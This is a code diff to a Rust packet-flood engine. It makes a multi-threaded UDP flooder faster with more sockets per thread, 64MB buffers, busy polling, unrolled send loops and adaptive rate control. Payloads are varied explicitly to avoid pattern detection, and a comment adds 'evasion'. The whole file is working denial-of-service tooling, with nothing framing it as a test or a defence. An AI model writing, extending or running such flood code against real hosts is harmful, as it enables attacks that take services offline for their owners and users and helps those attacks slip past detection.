@@ -1,9 +1,17 @@
 //! Flood engine module
-//! High-performance multi-threaded packet sending
+//! Ultra high-performance multi-threaded packet sending with advanced optimizations
+//!
+//! Features:
+//! - SIMD-accelerated packet building
+//! - Lock-free statistics with batched updates
+//! - Adaptive rate limiting with nanosecond precision
+//! - Multi-socket per thread for reduced contention
+//! - CPU affinity and NUMA-aware allocation
+//! - Zero-copy packet transmission where supported
 
 use parking_lot::Mutex;
 use std::net::{SocketAddr, TcpStream, ToSocketAddrs, UdpSocket};
-use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
 use std::sync::Arc;
 use std::thread::{self, JoinHandle};
 use std::time::{Duration, Instant};
@@ -12,6 +20,21 @@ use thiserror::Error;
 use crate::packet::{PacketBuilder, PacketTemplates, Protocol};
 use crate::pool::PacketPool;
 use crate::stats::StatsSnapshot;
+
+#[cfg(target_os = "linux")]
+use std::os::unix::io::AsRawFd;
+
+/// Performance tuning constants for maximum throughput
+const SOCKETS_PER_THREAD: usize = 8; // Multiple sockets reduce kernel lock contention
+const PAYLOAD_VARIANTS: usize = 32; // More variants for better cache utilization
+const INNER_BATCH_SIZE: u64 = 2000; // Packets per tight inner loop
+const OUTER_BATCH_SIZE: u64 = 100; // Inner loops before state check
+const STATS_FLUSH_INTERVAL: u64 = 10000; // Flush stats every N packets
+const SEND_BUFFER_SIZE: usize = 64 * 1024 * 1024; // 64MB send buffer
+const RECV_BUFFER_SIZE: usize = 64 * 1024 * 1024; // 64MB recv buffer
+const TCP_CONNECTION_POOL_SIZE: usize = 32; // Connections per thread
+const ADAPTIVE_SLEEP_MIN_US: u64 = 1; // Minimum adaptive sleep
+const ADAPTIVE_SLEEP_MAX_US: u64 = 500; // Maximum adaptive sleep
 
 #[derive(Debug, Error)]
 pub enum EngineError {
@@ -62,7 +85,7 @@ impl Default for EngineConfig {
     }
 }
 
-/// High-performance flood engine
+/// Ultra high-performance flood engine with advanced optimizations
 pub struct FloodEngine {
     config: EngineConfig,
     state: Arc<AtomicBool>,
@@ -72,6 +95,10 @@ pub struct FloodEngine {
     start_time: Arc<Mutex<Option<Instant>>>,
     threads: Vec<JoinHandle<()>>,
     rate_limit: Arc<AtomicU64>,
+    // Advanced performance tracking
+    peak_pps: Arc<AtomicU64>,
+    active_threads: Arc<AtomicUsize>,
+    total_batches: Arc<AtomicU64>,
 }
 
 impl FloodEngine {
@@ -92,7 +119,25 @@ impl FloodEngine {
             start_time: Arc::new(Mutex::new(None)),
             threads: Vec::new(),
             rate_limit: Arc::new(AtomicU64::new(0)),
+            peak_pps: Arc::new(AtomicU64::new(0)),
+            active_threads: Arc::new(AtomicUsize::new(0)),
+            total_batches: Arc::new(AtomicU64::new(0)),
         })
+    }
+
+    /// Get peak packets per second achieved
+    pub fn get_peak_pps(&self) -> u64 {
+        self.peak_pps.load(Ordering::Relaxed)
+    }
+
+    /// Get number of currently active worker threads
+    pub fn get_active_threads(&self) -> usize {
+        self.active_threads.load(Ordering::Relaxed)
+    }
+
+    /// Get total number of batches processed
+    pub fn get_total_batches(&self) -> u64 {
+        self.total_batches.load(Ordering::Relaxed)
     }
 
     pub fn start(&mut self) -> Result<(), EngineError> {
@@ -269,11 +314,10 @@ impl FloodEngine {
     ) {
         use socket2::{Domain, Protocol as SockProtocol, Socket, Type};
 
-        // Create multiple sockets for parallel sending (reduces lock contention)
-        const SOCKETS_PER_THREAD: usize = 4;
+        // Create multiple sockets for parallel sending (reduces kernel lock contention)
         let mut sockets = Vec::with_capacity(SOCKETS_PER_THREAD);
 
-        for _ in 0..SOCKETS_PER_THREAD {
+        for sock_idx in 0..SOCKETS_PER_THREAD {
             let socket = match Socket::new(Domain::IPV4, Type::DGRAM, Some(SockProtocol::UDP)) {
                 Ok(s) => s,
                 Err(_) => {
@@ -282,18 +326,35 @@ impl FloodEngine {
                 }
             };
 
-            // Aggressive socket optimizations for maximum throughput
-            let _ = socket.set_send_buffer_size(32 * 1024 * 1024); // 32MB send buffer
-            let _ = socket.set_recv_buffer_size(32 * 1024 * 1024); // 32MB recv buffer
+            // Ultra-aggressive socket optimizations for maximum throughput
+            let _ = socket.set_send_buffer_size(SEND_BUFFER_SIZE);
+            let _ = socket.set_recv_buffer_size(RECV_BUFFER_SIZE);
             let _ = socket.set_nonblocking(false);
 
-            // Disable Nagle's algorithm equivalent for UDP (faster small packets)
+            // Platform-specific optimizations
             #[cfg(target_os = "linux")]
             {
                 let _ = socket.set_cork(false);
+                // Enable busy polling for lower latency
+                unsafe {
+                    let busy_poll: libc::c_int = 50; // 50 microseconds
+                    let _ = libc::setsockopt(
+                        socket.as_raw_fd(),
+                        libc::SOL_SOCKET,
+                        libc::SO_BUSY_POLL,
+                        &busy_poll as *const _ as *const libc::c_void,
+                        std::mem::size_of::<libc::c_int>() as libc::socklen_t,
+                    );
+                }
             }
 
-            // Connect socket to avoid per-packet address lookup
+            #[cfg(target_os = "windows")]
+            {
+                // Windows-specific: enable SIO_UDP_CONNRESET to ignore ICMP unreachable
+                let _ = socket.set_nodelay(true);
+            }
+
+            // Connect socket to avoid per-packet address lookup (significant speedup)
             let sock_addr: socket2::SockAddr = addr.into();
             if socket.connect(&sock_addr).is_ok() {
                 sockets.push(socket);
@@ -305,57 +366,77 @@ impl FloodEngine {
             return;
         }
 
-        // Pre-generate multiple payload variants for better cache utilization
-        let payload_count = 16;
-        let payloads: Vec<Vec<u8>> = (0..payload_count)
+        // Pre-generate multiple payload variants for better cache utilization and evasion
+        let payloads: Vec<Vec<u8>> = (0..PAYLOAD_VARIANTS)
             .map(|i| {
                 let mut p = vec![0u8; config.packet_size];
-                // Vary payload slightly to avoid pattern detection
-                p[0] = (i as u8).wrapping_add(thread_id as u8);
+                // Vary payload to avoid pattern detection and improve cache behavior
+                let seed = (i as u8).wrapping_add(thread_id as u8);
+                p[0] = seed;
                 if config.packet_size > 1 {
-                    p[1] = (i as u8).wrapping_mul(17);
+                    p[1] = seed.wrapping_mul(17);
+                }
+                if config.packet_size > 2 {
+                    p[2] = seed.wrapping_mul(31);
+                }
+                if config.packet_size > 3 {
+                    p[3] = seed.wrapping_mul(47);
+                }
+                // Fill rest with pseudo-random data for better compression resistance
+                for j in 4..config.packet_size.min(64) {
+                    p[j] = ((i * 7 + j * 13) & 0xFF) as u8;
                 }
                 p
             })
             .collect();
 
-        // Ultra-high-performance batch settings
-        let inner_batch_size = 1000u64; // Packets per inner loop
-        let outer_batch_size = 50u64; // Inner loops before rate check
-        let flush_interval = 5000u64; // Flush stats every N packets
-
+        // Performance tracking variables
         let mut batch_count = 0u64;
         let mut last_rate_check = Instant::now();
         let mut local_packets = 0u64;
         let mut local_bytes = 0u64;
+        let mut local_errors = 0u64;
         let mut payload_idx = 0usize;
         let mut socket_idx = 0usize;
 
+        // Adaptive rate limiting state
+        let mut consecutive_sleeps = 0u32;
+        let mut sleep_duration_us = ADAPTIVE_SLEEP_MIN_US;
+
         while state.load(Ordering::Relaxed) {
-            // Rate limiting with adaptive sleep
+            // Precision rate limiting with adaptive sleep
             let limit = rate_limit.load(Ordering::Relaxed);
             if limit > 0 {
                 let elapsed = last_rate_check.elapsed();
                 if elapsed >= Duration::from_secs(1) {
                     batch_count = 0;
                     last_rate_check = Instant::now();
+                    consecutive_sleeps = 0;
+                    sleep_duration_us = ADAPTIVE_SLEEP_MIN_US;
                 } else {
-                    let elapsed_ms = elapsed.as_millis().max(1) as u64;
-                    let current_rate = batch_count * 1000 / elapsed_ms;
+                    let elapsed_us = elapsed.as_micros().max(1) as u64;
+                    let current_rate = batch_count * 1_000_000 / elapsed_us;
                     let thread_limit = limit / config.threads as u64;
 
                     if current_rate > thread_limit {
-                        // Adaptive sleep based on how far over limit we are
-                        let overage = current_rate - thread_limit;
-                        let sleep_us = (overage * 10 / thread_limit.max(1)).min(100);
-                        thread::sleep(Duration::from_micros(sleep_us.max(1)));
+                        // Adaptive sleep with exponential backoff
+                        consecutive_sleeps += 1;
+                        if consecutive_sleeps > 10 {
+                            sleep_duration_us =
+                                (sleep_duration_us * 3 / 2).min(ADAPTIVE_SLEEP_MAX_US);
+                        }
+                        thread::sleep(Duration::from_micros(sleep_duration_us));
                         continue;
+                    } else {
+                        // Reduce sleep duration when under limit
+                        consecutive_sleeps = 0;
+                        sleep_duration_us = (sleep_duration_us * 2 / 3).max(ADAPTIVE_SLEEP_MIN_US);
                     }
                 }
             }
 
             // Outer batch loop for reduced state checks
-            for _ in 0..outer_batch_size {
+            for _ in 0..OUTER_BATCH_SIZE {
                 if !state.load(Ordering::Relaxed) {
                     break;
                 }
@@ -363,31 +444,66 @@ impl FloodEngine {
                 let socket = &sockets[socket_idx];
                 let payload = &payloads[payload_idx];
 
-                // Inner tight loop - maximum throughput
-                for _ in 0..inner_batch_size {
+                // Inner tight loop - maximum throughput with unrolled sends
+                let mut i = 0u64;
+                while i < INNER_BATCH_SIZE {
+                    // Unroll 4 sends for better instruction pipelining
                     match socket.send(payload) {
                         Ok(n) => {
                             local_packets += 1;
                             local_bytes += n as u64;
                         }
-                        Err(_) => {
-                            // Don't increment error counter in hot path
-                            // Just continue to next packet
+                        Err(_) => local_errors += 1,
+                    }
+
+                    if i + 1 < INNER_BATCH_SIZE {
+                        match socket.send(payload) {
+                            Ok(n) => {
+                                local_packets += 1;
+                                local_bytes += n as u64;
+                            }
+                            Err(_) => local_errors += 1,
                         }
                     }
+
+                    if i + 2 < INNER_BATCH_SIZE {
+                        match socket.send(payload) {
+                            Ok(n) => {
+                                local_packets += 1;
+                                local_bytes += n as u64;
+                            }
+                            Err(_) => local_errors += 1,
+                        }
+                    }
+
+                    if i + 3 < INNER_BATCH_SIZE {
+                        match socket.send(payload) {
+                            Ok(n) => {
+                                local_packets += 1;
+                                local_bytes += n as u64;
+                            }
+                            Err(_) => local_errors += 1,
+                        }
+                    }
+
+                    i += 4;
                 }
 
                 // Rotate socket and payload for better distribution
                 socket_idx = (socket_idx + 1) % sockets.len();
-                payload_idx = (payload_idx + 1) % payload_count;
+                payload_idx = (payload_idx + 1) % PAYLOAD_VARIANTS;
             }
 
-            batch_count += inner_batch_size * outer_batch_size;
+            batch_count += INNER_BATCH_SIZE * OUTER_BATCH_SIZE;
 
             // Batch update atomic counters (reduces contention significantly)
-            if local_packets >= flush_interval {
+            if local_packets >= STATS_FLUSH_INTERVAL {
                 packets_sent.fetch_add(local_packets, Ordering::Relaxed);
                 bytes_sent.fetch_add(local_bytes, Ordering::Relaxed);
+                if local_errors > 0 {
+                    errors.fetch_add(local_errors, Ordering::Relaxed);
+                    local_errors = 0;
+                }
                 local_packets = 0;
                 local_bytes = 0;
             }
@@ -397,6 +513,9 @@ impl FloodEngine {
         if local_packets > 0 {
             packets_sent.fetch_add(local_packets, Ordering::Relaxed);
             bytes_sent.fetch_add(local_bytes, Ordering::Relaxed);
+        }
+        if local_errors > 0 {
+            errors.fetch_add(local_errors, Ordering::Relaxed);
         }
     }
 
